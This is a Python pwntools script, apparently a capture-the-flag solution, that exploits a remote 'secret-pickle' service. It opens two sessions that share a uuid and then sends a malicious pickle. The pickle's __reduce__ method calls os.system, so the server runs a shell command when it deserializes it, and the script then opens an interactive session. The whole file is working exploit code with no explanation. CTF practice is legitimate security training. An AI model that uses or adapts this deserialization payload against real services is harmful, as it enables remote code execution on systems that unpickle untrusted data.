from pwn import *

host = "secret-pickle.420blaze.in"
port = 420

r1 = remote(host, port)
#r2 = remote(host, port)

print r1.recvuntil("(y/n)")
#print r2.recvuntil("(y/n")
r1.sendline("n")
data = r1.recvuntil("username:")
print data.split("\n")
uuid = data.split("\n")[0].split(" ")[-1]

print "uuid: " + uuid

r1.sendline("asdf")
r1.recvuntil("choice:")

r2 = remote(host, port)
r2.recvuntil("(y/n)")
r2.sendline("y")
r2.recvuntil("uuid?")
r2.sendline(uuid)
r2.recvuntil("username:")
r2.sendline("asdf")
print r2.recvuntil("choice:")


r1.sendline("0")
r2.sendline("1")

r1.recvuntil("choice:")
r2.recvuntil("choice:")

r2.sendline("0")
r2.recvuntil("name:")
r2.sendline("a")
r2.recvuntil("content:")
import os
import pickle

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('ls',))


shellcode = pickle.dumps(Exploit(), protocol=0)
print shellcode

r2.sendline(shellcode + "\n")

r1.sendline("1")
r1.recvuntil("name:")
r1.sendline("a")
r1.interactive()
